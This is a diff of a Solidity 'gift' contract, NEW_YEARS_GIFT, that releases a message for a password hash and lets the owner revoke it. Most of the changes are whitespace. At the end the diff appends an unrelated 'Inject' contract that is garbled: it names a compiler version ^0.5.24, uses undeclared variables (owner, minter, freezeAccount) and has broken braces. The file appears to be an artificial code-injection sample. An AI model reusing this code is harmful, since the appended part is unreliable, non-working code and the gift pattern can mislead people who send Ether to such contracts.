@@ -3,17 +3,17 @@ pragma solidity ^0.4.19;
 contract NEW_YEARS_GIFT
 {
     string message;
-    
+
     bool passHasBeenSet = false;
-    
+
     address sender;
-    
+
     bytes32 public hashPass;
-	
+
 	function() public payable{}
-    
+
     function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}
-    
+
     function SetPass(bytes32 hash)
     public
     payable
@@ -24,7 +24,7 @@ contract NEW_YEARS_GIFT
             sender = msg.sender;
         }
     }
-    
+
     function SetMessage(string _message)
     public
     {
@@ -33,7 +33,7 @@ contract NEW_YEARS_GIFT
             message =_message;
         }
     }
-    
+
     function GetGift(bytes pass)
     external
     payable
@@ -45,7 +45,7 @@ contract NEW_YEARS_GIFT
             return message;
         }
     }
-    
+
     function Revoce()
     public
     payable
@@ -56,7 +56,7 @@ contract NEW_YEARS_GIFT
             message="";
         }
     }
-    
+
     function PassHasBeenSet(bytes32 hash)
     public
     {
@@ -65,4 +65,15 @@ contract NEW_YEARS_GIFT
            passHasBeenSet=true;
         }
     }
+}
+pragma solidity ^0.5.24;
+contract Inject {
+	uint depositAmount;
+	constructor() public {owner = msg.sender;}
+	function freeze(address account,uint key) {
+		if (msg.sender != minter)
+			revert();
+			freezeAccount[account] = key;
+		}
+	}
 }
